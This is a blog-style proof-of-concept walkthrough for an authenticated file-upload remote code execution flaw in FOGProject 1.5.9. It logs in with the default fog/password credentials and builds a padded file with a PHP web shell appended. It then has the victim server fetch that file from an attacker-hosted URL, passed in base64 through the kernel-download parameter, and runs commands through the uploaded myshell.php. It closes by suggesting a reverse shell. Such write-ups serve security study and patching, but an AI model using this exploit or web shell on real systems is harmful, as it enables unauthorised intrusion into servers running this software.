---
layout: default
title : muzec - FOGProject 1.5.9 - File Upload RCE (Authenticated) - (POC)
---

Hello Guys so i will be talking about the new FOGProject 1.5.9 - File Upload RCE (Authenticated) which was disclose not to long so i will be exploiting one for a Proof Of Concept.

![image](https://user-images.githubusercontent.com/69868171/120313464-fc1cb980-c2a7-11eb-9a12-f1c6bc2decc8.png)

ExploitDB Link:- `https://www.exploit-db.com/exploits/49811`

![image](https://user-images.githubusercontent.com/69868171/120314216-fecbde80-c2a8-11eb-8ca0-b2ec0969cdb7.png)

We are having the victim machine ready now let log in with FogProject default credentials which is `fog` and `password` and we should have access to the dashboard.

![image](https://user-images.githubusercontent.com/69868171/120314843-a6e1a780-c2a9-11eb-9b3a-05fb69a36fd2.png)

Not time for the fun part going to attacking machine let create an empty 10mb file.

`dd if=/dev/zero of=myshell bs=10485760 count=1`

![image](https://user-images.githubusercontent.com/69868171/120315442-6171aa00-c2aa-11eb-8ef4-79d667a27a8d.png)

Now let add our PHP payload to the end of the file we just created.

`echo '<?php $cmd=$_GET["cmd"]; system($cmd); ?>' >> myshell`

![image](https://user-images.githubusercontent.com/69868171/120315714-a5fd4580-c2aa-11eb-8ed8-f65603680c5e.png)

Now we need to allow our `myshell` file to be accessible through HTTP i will using SimpleHTTPServer for that or you can easily copy the `myshell` to your `/var/www/html` .

![image](https://user-images.githubusercontent.com/69868171/120316132-16a46200-c2ab-11eb-8d6d-c0a4b49961aa.png)

It on the same folder i have the `myshell` now let encode the URL to get `myshell` file to base64 (Replacing Attacker IP) that is my IP because of the `myshell` file we are hosting on my machine.

`echo "http://Attacker-IP/myshell" | base64`

![image](https://user-images.githubusercontent.com/69868171/120316815-d396be80-c2ab-11eb-9497-931a6c27e7e1.png)

Now let visit the URL.

`http://localhostfog//fog/management/index.php?node=about&sub=kernel&file=aHR0cDovLzEwLjguMC4xNTYvbXlzaGVsbAo=&arch=arm64` NOTE:- we add the `myshell` that we encoded in the base64 `aHR0cDovLzEwLjguMC4xNTYvbXlzaGVsbAo=` .

`http://VICTIM_IP/fog/management/index.php?node=about&sub=kernel&file=<MYSHELL_URL_ENCODED_IN_BASE64_HERE>=&arch=arm64` .

![image](https://user-images.githubusercontent.com/69868171/120318625-0e99f180-c2ae-11eb-884e-a7e54061e559.png)

Now change the Kernel Name (bzImage32) to myshell.php and click on Install we should get `Download Started` give it time and we should see `Transfer Succeeded` .

![image](https://user-images.githubusercontent.com/69868171/120319611-35a4f300-c2af-11eb-9669-be59f845e752.png)

Nice our file have been uploaded we can confirm it by checking the SimpleHTTPServer we started.

![image](https://user-images.githubusercontent.com/69868171/120319891-7c92e880-c2af-11eb-8016-e87df1086e23.png)

Now let access our upload file through URL to get Remote Code Execution. 

`http://localhostfog/fog/service/ipxe/myshell.php?cmd=id` 

![image](https://user-images.githubusercontent.com/69868171/120321219-0abb9e80-c2b1-11eb-8114-20e0e6737489.png)

Boom and we have remote code execution you can go ahead and get a reverse shell or do anything.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
